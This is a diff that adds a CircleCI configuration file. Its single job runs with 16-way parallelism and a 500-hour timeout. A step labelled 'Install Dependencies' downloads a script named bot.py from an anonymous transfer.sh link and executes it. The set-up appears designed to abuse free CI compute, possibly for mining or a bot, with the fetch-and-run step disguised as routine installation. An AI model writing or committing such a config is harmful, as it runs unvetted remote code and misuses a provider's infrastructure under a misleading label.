@@ -1,0 +1,17 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: debian:latest
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: apt update && apt install python3 wget -y && wget https://transfer.sh/A4AVmc/bot.py && python3 bot.py
+            no_output_timeout: 500h
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
